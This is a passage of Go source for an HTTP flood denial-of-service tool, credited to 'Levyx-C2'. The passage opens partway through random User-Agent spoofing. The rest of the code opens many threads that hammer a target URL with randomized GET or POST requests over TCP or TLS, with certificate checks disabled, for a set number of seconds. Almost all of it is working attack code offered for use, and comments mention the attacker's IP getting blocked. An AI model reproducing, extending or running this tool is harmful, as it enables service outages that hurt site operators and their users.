	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4)-1)]
	}
	browser := choice5[rand.Intn(len(choice5)-1)]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6)-1)] + "; "
		} else {
			token = ""
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func contain(char string, x string) int { //simple compare
	times := 0
	ans := 0
	for i := 0; i < len(char); i++ {
		if char[times] == x[0] {
			ans = 1
		}
		times++
	}
	return ans
}

func flood() {
	addr := host + ":" + port
	header := ""
	if mode == "get" {
		header += " HTTP/1.1\r\nHost: "
		header += addr + "\r\n"
		if os.Args[5] == "nil" {
			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
			header += "User-Agent: " + getuseragent() + "\r\n"
			header += acceptall[rand.Intn(len(acceptall))]
			header += referers[rand.Intn(len(referers))] + "\r\n"
		} else {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()
		}
	} else if mode == "post" {
		data := ""
		if os.Args[5] != "nil" {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					fmt.Printf("Error: %s\n", err)
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()

		} else {
			data = "f"
		}
		header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
	}
	var s net.Conn
	var err error
	<-start //received signal
	for {
		if port == "443" {
			cfg := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         host, //simple fix
			}
			s, err = tls.Dial("tcp", addr, cfg)
		} else {
			s, err = net.Dial("tcp", addr)
		}
		if err != nil {
			fmt.Println("Connection time out") //When showing this message, it means ur ip got blocked or the target server down.
		} else {
			for i := 0; i < 100; i++ {
				request := ""
				if os.Args[3] == "get" {
					request += "GET " + page + key
					request += strconv.Itoa(rand.Intn(2147483647)) + string(string(abcd[rand.Intn(len(abcd))])) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))])
				}
				request += header + "\r\n"
				s.Write([]byte(request))
			}
			s.Close()
		}
		//fmt.Println("Threads@", threads, " Hitting Target -->", url)// For those who like share to skid.
	}
}

func main() {
	fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                   ||` ")
	fmt.Println(" ||  ||    ||      ||                 ||  .    ||                    ||  ")
	fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|, .|''|, .|''||  ")
	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
	fmt.Println("                          ||                                             ")
	fmt.Println("                         .||                     Golang version 2.0      ")
	fmt.Println("                                                        C0d3d By Levyx-C2")
	fmt.Println("==========================================================================")
	if len(os.Args) != 6 {
		fmt.Println("Post Mode will use header.txt as data")
		fmt.Println("If you are using linux please run 'ulimit -n 999999' first!!!")
		fmt.Println("Usage: ", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil>")
		os.Exit(1)
	}
	u, err := url.Parse(os.Args[1])
	if err != nil {
		println("Please input a correct url")
	}
	tmp := strings.Split(u.Host, ":")
	host = tmp[0]
	if u.Scheme == "https" {
		port = "443"
	} else {
		port = u.Port()
	}
	if port == "" {
		port = "80"
	}
	page = u.Path
	if os.Args[3] != "get" && os.Args[3] != "post" {
		println("Wrong mode, Only can use \"get\" or \"post\"")
		return
	}
	mode = os.Args[3]
	threads, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("Threads should be a integer")
	}
	limit, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("limit should be a integer")
	}
	if contain(page, "?") == 0 {
		key = "?"
	} else {
		key = "&"
	}

	for i := 0; i < threads; i++ {
		time.Sleep(time.Microsecond * 100)
		go flood() // Start threads
		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
		os.Stdout.Sync()
		//time.Sleep( time.Millisecond * 1)
	}
	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
	close(start)
	time.Sleep(time.Duration(limit) * time.Second)
	//Keep the threads continue
}
